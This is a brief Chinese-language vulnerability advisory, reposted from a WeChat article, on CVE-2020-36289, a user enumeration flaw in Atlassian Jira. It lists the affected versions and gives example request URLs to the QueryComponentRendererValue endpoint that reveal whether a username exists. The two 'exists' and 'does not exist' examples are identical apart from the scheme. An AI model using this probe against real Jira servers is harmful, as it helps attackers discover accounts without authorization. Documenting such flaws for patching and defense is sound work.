# CVE-2020-36289:Atlassian Jira User Enumeration

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg4MTU4NTc2Nw==&mid=2247485858&idx=2&sn=ef5489d5dccd5e73483fe69512ff23f0&chksm=cf62f2aaf8157bbc8b93db9f402eb6936d46f48f75b9811e269b5905aedd0722c0f9b9494e3e&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247485858&idx=2&sn=ef5489d5dccd5e73483fe69512ff23f0&chksm=cf62f2aaf8157bbc8b93db9f402eb6936d46f48f75b9811e269b5905aedd0722c0f9b9494e3e&scene=27#wechat_redirect)

#### 影响范围

*    Atlassian Jira < 8.5.13
    
*    Atlassian Jira 8.6.0 ~8.13.5
    
*    Atlassian Jira 8.14.0 ~8.15.1
    

#### 漏洞类型

系统用户枚举

#### 利用条件

影响范围应用

#### 漏洞概述

Atlassian Jira的/QueryComponentRendererValue!Default.jspa端点可以用于进行用户枚举，如果Jira暴露在公网中，未授权用户就可以直接访问该端点爆破出潜在的用户名

#### 漏洞复现

用户存在：

http://x.x.x.x:8080/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin

![](../Images/da59e2530853be1df68fd35ff445fa8f.png)

用户不存在：

https://x.x.x.x/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
